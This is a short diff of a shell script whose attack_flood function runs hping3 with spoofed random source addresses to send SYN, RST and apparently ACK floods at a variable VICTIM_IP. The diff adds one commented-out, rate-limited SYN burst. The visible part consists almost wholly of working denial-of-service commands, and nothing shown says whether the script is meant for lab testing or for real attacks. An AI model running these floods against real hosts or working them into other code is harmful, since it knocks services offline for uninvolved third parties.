@@ -122,6 +122,7 @@ attack_flood() {
     case "$ATTACK_VECTOR" in
         "flood-syn")
             timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD -L 0 -S "$VICTIM_IP"    ;;
+#            hping3 --rand-source --faster -c 20 -p $__TARGET_PORT_FLOOD -L 0 -S "$VICTIM_IP"    ;;
         "flood-rst")
             timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD -L 0 -b -R "$VICTIM_IP" ;;
         "flood-ack")
